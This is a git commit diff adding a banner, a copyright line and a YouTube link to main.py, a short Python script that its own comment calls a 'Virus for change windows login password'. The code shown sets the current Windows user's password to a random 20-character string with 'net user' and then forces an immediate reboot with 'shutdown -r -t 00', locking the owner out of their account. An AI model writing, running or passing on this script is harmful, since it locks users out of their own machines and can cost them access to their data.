d00a8bcea3ff26e1365497206a774e256ab86c7c
Mohammad Ali Bazzazi <81759694+bazzazi@users.noreply.github.com>
2022-03-17 20:13:50 +0330

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,26 @@
+# Virus for change windows login password
+# Developer: Mohammad Ali Bazzazi (me)
+
+print("""
+_______________     __________   _______   _______    _________   _______    #
+|              \   |          |        /         /   |         |        /   
+|               |  |          |       /         /    |         |       /     |
+|              /   |          |      /         /     |         |      /      |
+|_____________|    |__________|     /         /      |_________|     /       |
+|              \   |          |    /         /       |         |    /        |
+|               |  |          |   /         /        |         |   /         |
+|              /   |          |  /         /         |         |  /          |
+|_____________/    |          | /_______  /_______   |         | /______     |
+""")
+print("*********************************************************************************")
+print("*"+" "*79+"*")
+print("*  Copyright of Mohammad Ali Bazzazi, 2021 ©                                    *")
+print("*"+" "*79+"*")
+print("*  https://www.youtube.com/channel/UCeLKoNs3c72Vc-OG3uNQxGw?sub_confirmation=1  *")
+print("*"+" "*79+"*")
+print("*********************************************************************************")
+
+################## START ##################
 import os
 import random
 
@@ -10,5 +33,6 @@ alphabet=list("ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 password="".join(random.choices(alphabet, k=20)) # create strong password
 
 os.system(f"""net user "{username}" "{password}" """) #change user password
+################## END ##################
 
 os.system("shutdown -r -t 00") # reboot system
